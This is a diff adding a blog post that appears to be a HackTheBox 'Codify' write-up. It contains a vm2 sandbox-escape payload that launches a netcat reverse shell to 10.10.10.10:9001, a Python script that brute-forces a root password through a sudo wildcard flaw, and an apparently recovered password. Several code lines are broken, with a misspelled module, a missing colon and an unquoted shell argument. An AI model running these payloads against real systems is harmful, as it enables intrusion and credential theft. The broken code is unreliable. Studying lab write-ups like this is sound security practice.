@@ -1,0 +1,107 @@
+---
+layout: post
+title: "Codify e2e4dadbc8fe4382b136fde11892ad8b"
+date:   2025-07-10 12:05:57 -0400
+categories: writeups
+---
+
+# Codify
+
+HackTheBox: Medium
+
+<aside>
+💡 Codify is a compiler service it runs on VM2 we just find its vulnerabilitie having code we execute
+
+</aside>
+
+## 1: Enumeration
+
+- nmap scanning
+
+ 
+
+![Untitled]({{ '/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled_1.png' | relative_url }})
+
+FOOTHOLD
+
+```bash
+const {VM} = require("vm2");
+const vm = new VM();
+
+const code = `
+cmd = 'id'
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};
+  
+const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) {
+    c.constructor('return process')().mainModule.require('child_process').execSync(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f);
+}
+`
+console.log(vm.run(code));
+```
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
+```
+
+## 2: User flag
+
+Route
+
+```bash
+/var/www/contact 
+```
+
+There is a db creds
+
+We use john for get user flag (joshua)
+
+![Untitled]({{ '/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled_2.png' | relative_url }})
+
+## 3: Priv esc
+
+> There is a mistake (bad practice) with mysql. Sometimes bash uses the admin password as a “args” and not as a string so we can use a script and with the help of * we can make:
+> 
+
+![Untitled]({{ '/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled_3.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b/de9a4e1e-19d2-40a6-848d-e590a41133d7-export-1b798080-ea5b-40f7-840b-6165772d2c2b_Untitled_4.png' | relative_url }})
+
+```bash
+import string
+import subproccess
+
+def check_password(p):
+	command = f"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh"
+	result = subprocess.run(command, shell=True, stdout=subproccess.PIPE, stderr=subproccess.PIPE, text=True)
+	return "Password confirmed!" in result.stdout
+
+charset = string.ascii_letters + string.digits
+password = ""
+is_password_found = False
+
+while not is_password_found:
+	for char in charset:
+		if check_password(password + char)
+			password += char
+			print(password)
+			break
+	else:
+		is_password_found = True
+```
+
+klj12h3jhaskjh12kjh3
+
+Machine pwned!
